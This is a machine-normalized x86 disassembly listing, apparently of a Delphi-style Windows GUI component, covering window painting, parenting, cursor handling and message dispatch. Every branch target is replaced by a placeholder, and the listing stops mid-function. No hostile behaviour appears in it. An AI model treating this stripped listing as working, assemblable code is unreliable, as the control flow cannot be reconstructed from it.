push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_449ca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418310
call sub_44c8d4
inc esi
dec ebx
jne r-xdata
sub_44c9d0
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44c8d4
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_44ca10
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_44c834
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_44c9d0
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406b78
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_449ca8
jmp r-xdata
sub_44ca98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403758#7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44cadf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cae6
call sub_44751c
call sub_4261e8
retn
sub_44cb10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_416cac
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406b60
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_449ca8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_44cbc8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_418310
call sub_44cb10
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_418310
call sub_44cb10
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_44cc5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f2dc
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b4c
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44cbc8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b60
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_449ca8
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44ccf0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_449264
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_449d74
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44cc5c
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b4c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_448638
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44cbc8
test eax eax
je r-xdata
mov eax ebx
call sub_45f870
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_449d74
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_44f2dc
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_449ca8
sub_44ce54
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_449f08
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_449ca8
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_4232e0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_423fac
call sub_4232e0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_423fe8
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_448694
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44cf5c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_4459d4
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_449ca8
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44cf90
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44d0b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d0e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d0b7
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418310
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_44d0e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41836c
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_418310
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416cd4
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_418310
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_4232e0
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_416cd4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_4232e0
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416cd4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_447430
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_449ca8
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_44d318
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_447430
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_44f2dc
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_44f2dc
push eax
call GetWindowLongA
test eax r--data
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_449ca8
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_449ca8
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_447430
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_44d318
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_418310
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44d46c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44cf90
jmp r-xdata
mov eax ebx
call sub_44c00c
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d5be
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_449ca8
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44d46c
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_44d5cc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44d5ec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44d660
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44d680
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44d6a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44d6c4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44d6e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44d70c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44d730
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43936c
mov edi eax
mov eax edi
call sub_43944c
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_423fe8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f2dc
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43954c
jmp r-xdata
sub_44d7b8
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44a5dc
test bl bl
je r-xdata
mov eax edi
call sub_44f5ec
mov eax edi
call sub_44f1e4
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_44f1e4
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_44d878
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_44a238
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44d8c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5ec
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44bb9c
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_40348c
sub_44d910
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_448638
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44cbc8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468094
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46657c
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_44da60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44db3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44db46
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_44f2dc
mov dl [ ebx + 0x184 ]
call sub_453f3c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4664f4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407ec0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4662f4
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4662f4
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
